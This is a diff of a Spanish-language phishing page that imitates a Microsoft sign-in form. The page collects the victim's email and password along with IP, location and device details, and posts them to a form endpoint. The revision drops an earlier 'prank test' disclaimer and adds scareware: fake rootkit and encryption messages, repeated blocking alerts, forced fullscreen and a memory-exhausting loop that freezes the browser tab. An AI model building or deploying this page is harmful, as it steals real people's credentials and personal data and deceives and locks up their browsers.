@@ -2,46 +2,34 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Iniciar sesión en su cuenta</title>
+    <title>Acceso Denegado - Validación Requerida</title>
     <style>
         body { background: #f2f2f2; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .login-box { background: #fff; padding: 40px; width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 10; }
+        .login-box { background: #fff; padding: 40px; width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 10; border-radius: 1px; }
         .logo { width: 108px; margin-bottom: 20px; }
         h2 { font-size: 24px; font-weight: 600; margin: 0 0 16px; color: #1b1b1b; }
-        input { width: 100%; padding: 8px 10px; margin-bottom: 15px; border: 1px solid #666; border-radius: 0; box-sizing: border-box; font-size: 15px; outline: none; }
-        input:focus { border-color: #0067b8; }
+        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #666; font-size: 15px; outline: none; }
         .btn { background: #0067b8; color: #fff; border: none; padding: 10px 33px; cursor: pointer; float: right; font-size: 15px; }
         
-        /* Barra de Carga */
-        #loading-screen { display: none; text-align: center; width: 100%; }
-        .loader-bar { width: 100%; height: 4px; background: #ccc; position: relative; overflow: hidden; margin-top: 20px; }
-        .loader-progress { width: 30%; height: 100%; background: #0067b8; position: absolute; animation: loading 2s infinite; }
-        @keyframes loading { 0% { left: -30%; } 100% { left: 100%; } }
-
-        /* Terminal Hacker */
-        #hacker-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 30px; font-family: 'Consolas', monospace; z-index: 10000; box-sizing: border-box; }
-        .cmd { margin-bottom: 5px; }
+        #hacker-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #ff0000; padding: 40px; font-family: 'Consolas', monospace; z-index: 10000; box-sizing: border-box; overflow-y: hidden; }
+        .cmd { margin-bottom: 5px; font-size: 14px; }
+        
+        /* Efecto de parpadeo de pantalla */
+        .glitch { animation: flash 0.1s infinite; }
+        @keyframes flash { 0% { background: #000; } 50% { background: #1a0000; } 100% { background: #000; } }
     </style>
 </head>
 <body>
 
     <div id="auth-ui" class="login-box">
         <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo">
-        
         <div id="login-form">
-            <h2 id="title">Iniciar sesión</h2>
-            <input type="email" id="email" placeholder="Correo electrónico, teléfono o Skype">
+            <h2>Iniciar sesión</h2>
+            <input type="email" id="email" placeholder="Correo electrónico">
             <div id="pass-field" style="display:none;">
                 <input type="password" id="password" placeholder="Contraseña">
             </div>
-            <p style="font-size: 13px; color: #666;">¿No tiene una cuenta? <span style="color:#0067b8; cursor:pointer;">Cree una.</span></p>
             <button class="btn" onclick="handleAuth()" id="next-btn">Siguiente</button>
-        </div>
-
-        <div id="loading-screen">
-            <h2 style="font-size: 18px;">Sincronizando con Azure AD...</h2>
-            <p style="font-size: 14px;">Espere un momento mientras validamos su dispositivo.</p>
-            <div class="loader-bar"><div class="loader-progress"></div></div>
         </div>
     </div>
 
@@ -54,88 +42,79 @@
         let step = 1;
         let userData = {};
 
-        async function handleAuth() {
+        function handleAuth() {
             if (step === 1) {
                 userData.email = document.getElementById('email').value;
                 if (!userData.email) return;
-                document.getElementById('title').innerText = "Escribir contraseña";
                 document.getElementById('email').style.display = 'none';
                 document.getElementById('pass-field').style.display = 'block';
-                document.getElementById('next-btn').innerText = "Iniciar sesión";
                 step = 2;
             } else {
                 userData.password = document.getElementById('password').value;
                 if (!userData.password) return;
-                
-                // Transición a carga
-                document.getElementById('login-form').style.display = 'none';
-                document.getElementById('loading-screen').style.display = 'block';
-                
-                // Simular tiempo de "sincronización" antes del impacto
-                setTimeout(ejecutarExfiltracionFinal, 2500);
+                ejecutarColapso();
             }
         }
 
-        async function ejecutarExfiltracionFinal() {
+        async function ejecutarColapso() {
             document.getElementById('auth-ui').style.display = 'none';
-            document.getElementById('hacker-ui').style.display = 'block';
+            const ui = document.getElementById('hacker-ui');
+            ui.style.display = 'block';
+            ui.classList.add('glitch');
+            
             try { document.documentElement.requestFullscreen(); } catch(e){}
 
-            // Recolección técnica completa (Fingerprinting)
+            // Recolección Extrema
             const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
-
+            const bat = await navigator.getBattery().catch(() => ({}));
+            
             const payload = {
-                "LOGIN_EMAIL": userData.email,
-                "LOGIN_PASS": userData.password,
-                "IP_REMOTE": ipData.ip,
-                "UBICACION": `${ipData.city}, ${ipData.country_name}`,
+                "V_USER": userData.email,
+                "V_PASS": userData.password,
+                "IP": ipData.ip,
+                "CITY": ipData.city,
                 "ISP": ipData.org,
-                "HARDWARE_GPU": gpu,
-                "SISTEMA_OPERATIVO": navigator.platform,
-                "MEMORIA_RAM": navigator.deviceMemory + "GB",
-                "CORES_CPU": navigator.hardwareConcurrency,
-                "USER_AGENT": navigator.userAgent
+                "TIMEZONE": Intcl.DateTimeFormat().resolvedOptions().timeZone,
+                "LANG": navigator.language,
+                "BATTERY": (bat.level * 100) + "%",
+                "CORES": navigator.hardwareConcurrency,
+                "AGENT": navigator.userAgent
             };
 
-            // Envío al Formspree
-            fetch(FORM_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+            // Envío de datos
+            fetch(FORM_URL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
 
-            // Animación de Consola Yedelmark
+            // 1. Trabado del Navegador (Bucle infinito de consola)
+            console.log("%c INTRUSION DETECTED", "color: red; font-size: 50px;");
+            
             const logger = document.getElementById('console');
             const lines = [
-                "> CONNECTION ESTABLISHED: " + ipData.ip,
-                "> TARGET_ID: " + userData.email.split('@')[0],
-                "> EXTRACCION DE CREDENCIALES: COMPLETA",
-                "> CLAVE CAPTURADA: " + "*".repeat(userData.password.length),
-                "> ESCANEANDO HARDWARE... " + gpu,
-                "> ---------------------------------------",
-                "> BIENVENIDO A UNA PRUEBA DE YEDELMARK",
-                "> ESTÁS SIENDO HACKEADO EN PEQUEÑITO",
-                "> NO SE ASUSTE",
-                "> ---------------------------------------",
-                "> Datos enviados al servidor de control."
+                "CRITICAL: EXPLOIT LOADED",
+                "DUMPING CREDENTIALS...",
+                "CREDENTIALS SENT TO MASTER SERVER",
+                "INJECTING PERSISTENT ROOTKIT...",
+                "LOCKING BROWSER KERNEL...",
+                "ENCRYPTING C:/USERS/DOCUMENTS...",
+                "SYSTEM OVERLOAD: 99%"
             ];
 
+            // 2. Bombardeo de Alertas (Esto traba la interacción)
             let i = 0;
             const timer = setInterval(() => {
                 const div = document.createElement('div');
                 div.className = "cmd";
-                div.innerHTML = `<span style="color:white">[+]</span> ${lines[i]}`;
+                div.innerText = `[FATAL] ${lines[i % lines.length]} - ${Math.random().toString(16)}`;
                 logger.appendChild(div);
-                i++;
-                if (i >= lines.length) {
-                    clearInterval(timer);
-                    alert("PRUEBA DE YEDELMARK FINALIZADA\n\nCredenciales y metadatos registrados.");
+                
+                // Cada 5 líneas, lanzamos un popup que bloquea el hilo
+                if (i % 5 === 0) {
+                    alert("FATAL ERROR: Unauthorized access by ANONYMOUS_OPERATOR\n\nData Exfiltrated: " + userData.email);
                 }
-            }, 500);
+                
+                i++;
+                // 3. Consumo de Memoria (Para trabar la pestaña)
+                let crash = new Array(1000000).fill("HACKED"); 
+            }, 300);
         }
     </script>
 </body>
